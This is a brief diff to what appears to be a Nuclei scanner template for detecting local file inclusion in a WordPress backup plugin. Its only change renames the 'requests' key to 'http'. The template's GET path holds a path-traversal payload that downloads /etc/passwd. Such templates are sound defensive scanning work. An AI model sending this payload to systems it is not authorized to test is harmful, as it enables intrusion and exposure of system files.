@@ -3,7 +3,7 @@ info:
   name: wordpress-LFI
   author: 0x240x23elu
   severity: High
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/wp-admin/admin.php?page=supsystic-backup&tab=bupLog&download=../../../../../../../../../etc/passwd"
